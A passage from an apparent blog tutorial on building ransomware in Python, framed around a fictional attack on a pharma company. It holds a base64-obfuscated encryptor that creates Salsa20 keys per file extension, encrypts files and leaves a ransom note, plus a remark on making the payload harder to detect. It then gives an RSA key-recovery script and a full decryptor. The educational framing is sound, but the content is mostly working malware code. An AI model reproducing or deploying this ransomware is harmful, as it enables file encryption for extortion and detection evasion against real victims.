woJcHJpbnQoIkdlbmVyYXRpbmcgbmV3IGtleXMuLi4iKQoJc2Fsc2FrZXlzID0gW10KCWZvciBleHQgaW4gZmlsZV9leHRlbnNpb25zOgoJCXNhbHNha2V5ID0gUmFuZG9tLm5ldygpLnJlYWQoMikgKyAzMCAqIGInXHgwMCcKCQlwcmludChzYWxzYWtleSkKCQlzYWxzYWtleXMuYXBwZW5kKHNhbHNha2V5KQoKCXByaW50KCJXcml0aW5nIGluZm8uYmNyeXB0Li4uIikKCXdyaXRlSW5mbyhzYWxzYWtleXMpCgoJIyBFbmNyeXB0IGFsbCBmaWxlcyB0aGF0IGhhdmUgdGhlIHNwZWNpZmllZCBmaWxlIGV4dGVuc2lvbgoJZm9yIGkgaW4gcmFuZ2UobGVuKGZpbGVfZXh0ZW5zaW9ucykpOgoJCWZlID0gZmlsZV9leHRlbnNpb25zW2ldCgkJc2sgPSBzYWxzYWtleXNbaV0KCQllbmNyeXB0RmlsZUV4dGVuc2lvbihmZSwgc2spCgoJIyBMZWF2ZSByYW5zb20gbm90ZQoJcmFuc29tTm90ZSgpCgoJcHJpbnQoIkRvbmUuIEhhdmUgYSBuaWNlIGRheSEiKQoKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CgltYWluKCkKCg=='))"

{% endhighlight %}

The problem with the above command is that some parts of the base64 string will remain constant. This will make our malware easier to detect. I’ll let the reader find a solution for this 😛

## 6. The decryptor

After the pharma company contacted Y on Telegram, negotiated the ransom and paid it in Bitcoin, Y refuses to send the decryption software. This is because Y’s main goal was to damage the big pharma corporation. We, however, will still write a decryption software, just in case Y changes his mind.

First, let’s write a program that takes info.bcrypt as an input (the file will be sent on Telegram after the ransom is paid) and outputs the decrypted Salsa20 keys:

{% highlight python %}
import sys
import base64

import Crypto
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

masterkey = RSA.importKey(open("master_private.pem", "rb").read())
pub = masterkey.publickey()

bcrypt = open("info.bcrypt", "r").read()
lines = bcrypt.split("\n")

# Check if we have the right RSA key

for l in lines:
	if not l.startswith("Encrypted RSA public key: "):
		continue
	k = l.split(": ")[1].strip().encode()
	if k != base64.b64encode(pub.exportKey('PEM')):
		print("Public keys don;t match!")
		sys.exit(1)

# Attempt to decrypt all Salsa20 keys

dec = False
cipher = PKCS1_OAEP.new(masterkey)

print('keys=[')

for l in lines:
	if dec:
		try:
			txt = cipher.decrypt(base64.b64decode(l))
		except:
			continue
		a = txt.split(b".", 2)
		ext = "." + a[1].decode()
		key = a[2]
		print("('{}', {}),".format(ext, key))
	if "Encrypted file-specific keys:" in l:
		dec = True
print("]")

{% endhighlight %}

After that, we write the actual decryptor. Everything is pretty intuitive, so I’ll just paste the code below:

{% highlight python %}
keys=[
('.txt', b'\x8e\xe5\x05\xed&x\n\x12\xf2\xae<\xc5CB.,g\xf0\xc20\xc4\xbf\x12\x14\x8e\x1cJ \x11\x93\x8cO'),
('.pdf', b'\xf3\x99#\xceb\xdcm>\xcc<\xf6\xde\xac<y\x03\x85:\xdeC\x0e\xa4\xbe\xd6@\xf5\xfdL\xba\xbf4\x89'),
]

import os

import Crypto
from Crypto.Cipher import Salsa20

# fs_root = "/" - if the user is root
# fs_root = os.path.expanduser("~") - if the user doesn;t have root priviledges
fs_root = os.path.join(os.path.expanduser("~"), "test") # for testing purposes

def getFiles(dir, ext=".txt.enc"):
	fs = os.listdir(dir)
	files = list()
	for f in fs:
		path = os.path.join(dir, f)
		if os.path.isdir(path):
			files = files + getFiles(path, ext)
		else:
			if path.endswith(ext):
				files.append(path)
	return files

def decryptFile(file, key):
	#try:
	print("Decrypting {}...".format(file))
	enc = open(file, 'rb').read()
	nonce = enc[:8]
	ciphertext =enc[8:]
	cipher = Salsa20.new(key=key, nonce=nonce)
	plaintext = cipher.decrypt(ciphertext)
	open("{}".format(file.replace(".enc", "")), "wb").write(plaintext)
	os.remove(file)
	#except:
	#	print("Could not decrypt {}!".format(file))

def decryptFileExtension(ext, key):
	global fs_root
	files = getFiles(fs_root, ext + ".enc")
	for file in files:
		decryptFile(file, key)

def main():
	global keys
	global fs_root
	for ext, key in keys:
		decryptFileExtension(ext, key)
	# Cleanup
	os.remove(os.path.join(fs_root, 'info.bcrypt'))
	os.remove(os.path.join(fs_root, 'Desktop', 'OPEN_ME.txt'))

if __name__ == "__main__":
	main()

{% endhighlight %}

## 7. Conclusion

In conclusion, it is relatively easy to code a ransomware. I hope I helped demystify this type of malware and you, my reader, learned something new. Until next time, hack the world.

yakuhito, over.
